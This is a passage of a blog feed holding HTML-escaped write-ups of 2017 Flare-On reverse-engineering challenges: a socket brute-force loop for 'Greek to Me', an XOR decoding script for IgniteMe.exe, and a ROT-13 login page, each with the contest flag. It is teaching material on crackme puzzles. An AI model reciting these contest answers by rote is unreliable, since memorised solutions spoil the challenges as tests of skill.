	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Congratulations! But wait, where's my flag?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Received'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;repr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Put a breakpoints at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x401063&lt;/code&gt; with IDA, we can find the flag that got written to the stack was &lt;code class=&quot;highlighter-rouge&quot;&gt;et_tu_brute_force@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Notes:
    &lt;ul&gt;
      &lt;li&gt;Compared with &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt;:
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; is only for local interface, when a server listen &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; that means “only communicate within the same host”.&lt;/li&gt;
          &lt;li&gt;when a server listen on &lt;code class=&quot;highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt; that means “listen on every available network interface”.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;Challenge Author: Matt Williams (@0xmwilliams)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/0x000050/CTF/blob/master/2017_Flare-On/03_Greek_to_me/greek_to_me.exe&quot;&gt;Challenge download&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>2017 Flare-On Challenge 2 IgniteMe.exe</title>
   <link href="http://0.0.0.0:4000/2018/05/20/2017-Flare-On-2-IgniteMe.html"/>
   <updated>2018-05-20T00:00:00+08:00</updated>
   <id>http://0.0.0.0:4000/2018/05/20/2017 Flare-On #2 IgniteMe</id>
   <content type="html">&lt;p&gt;This is a crack me challenge. &lt;code class=&quot;highlighter-rouge&quot;&gt;IgniteMe.exe&lt;/code&gt; expects to run without any command line argument. It asks the player to input the flag and checks whether it’s correct or not.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\nnyl\Desktop\flareon4\Challenge2&amp;gt;IgniteMe.exe
G1v3 m3 t3h fl4g:  flareon
N0t t00 h0t R we? 7ry 4ga1nz plzzz!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Analysis:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/3rA8jZy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sub_4010F0&lt;/code&gt; function is used to read user input data，and stored the user input data at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x403078&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;sub_401050&lt;/code&gt; function is flag validation function, focusing on code block between &lt;code class=&quot;highlighter-rouge&quot;&gt;0x401088&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;0x4010AD&lt;/code&gt;, you can see where the input is processed by xor loop, and checks it against some data &lt;code class=&quot;highlighter-rouge&quot;&gt;enc&lt;/code&gt; (at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0403000&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/hoqtTCR.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sub_401000&lt;/code&gt; function is used to generate key, we can get an initial seed to be the number 4.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Solutions:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In the first loop, &lt;code class=&quot;highlighter-rouge&quot;&gt;IgniteMe.exe&lt;/code&gt; XOR’s 0x04 with the last character of user input data.  The result is then XOR’d with the second from last char, and it keeps on going.  The global variable &lt;code class=&quot;highlighter-rouge&quot;&gt;byte_403180&lt;/code&gt; stores the encoded user input data.&lt;/p&gt;

&lt;p&gt;Upon completion of encoded user input data, checks for correctness of the decrypted data (&lt;code class=&quot;highlighter-rouge&quot;&gt;enc&lt;/code&gt;). if it correct print &lt;code class=&quot;highlighter-rouge&quot;&gt;G00d j0b!&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Therefore, we can bruteforced the &lt;code class=&quot;highlighter-rouge&quot;&gt;enc&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.data:00403000 ; char enc[]
.data:00403000 enc dd 4549260Dh
.data:00403004 dd 4478172Ah
.data:00403008 dd 5E5D6C2Bh
.data:0040300C dd 172F1245h
.data:00403010 dd 6E6F442Bh
.data:00403014 dd 455F0956h
.data:00403018 dd 0A267347h
.data:0040301C dd 4817130Dh
.data:00403020 dd 4D400142h
.data:00403024 dd 69020Ch
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The following script obtains the flag.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x49&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x78&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x56&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x09&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x42&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;                    &lt;span class=&quot;c&quot;&gt;#key&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;Challenge #2 by Nhan Huynh&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/0x000050/CTF/blob/master/2017_Flare-On/02_IgniteMe/IgniteMe.exe&quot;&gt;Challenge download&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>2017 Flare-On Challenge 1 login.html</title>
   <link href="http://0.0.0.0:4000/2018/05/10/2017-Flare-On-1-Login.html"/>
   <updated>2018-05-10T00:00:00+08:00</updated>
   <id>http://0.0.0.0:4000/2018/05/10/2017 Flare-On #1 Login</id>
   <content type="html">&lt;p&gt;&lt;a href=&quot;http://flare-on.com&quot;&gt;Flare-On Challenge&lt;/a&gt; is the FireEye Labs Advanced Reverse Engineering (FLARE) team’s yearly reverse engineering contest. This is a CTF-style challenge for all active and aspiring reverse engineers, malware analysts, and security professionals.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/0x000050/CTF/tree/master/2017_Flare-On&quot;&gt;Challenges download&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;The &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2017/10/2017-flare-on-challenge-solutions.html&quot;&gt;solutions&lt;/a&gt; written by each challenge author&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;p&gt;login.html&lt;/p&gt;

&lt;p&gt;There is an HTML file with a form. We need to provide a flag and check for its correctness.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/BkoCOyn.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the content of &lt;code class=&quot;highlighter-rouge&quot;&gt;login.html&lt;/code&gt;, the HTML page containing a simple client-side JavaScript authentication using ROT-13.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE Html /&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;FLARE On 2017&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the flag&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;button&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prompt&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Click to check the flag&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;prompt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onclick&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 	 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 	 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rotFlag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;a-zA-Z&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
 	 &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Z&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;122&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
 	 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rotFlag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 	  &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Correct flag!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 	 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 	  &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Incorrect flag, rot again&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 	  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 	 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Use python to decode and extract this flag.&lt;/p&gt;
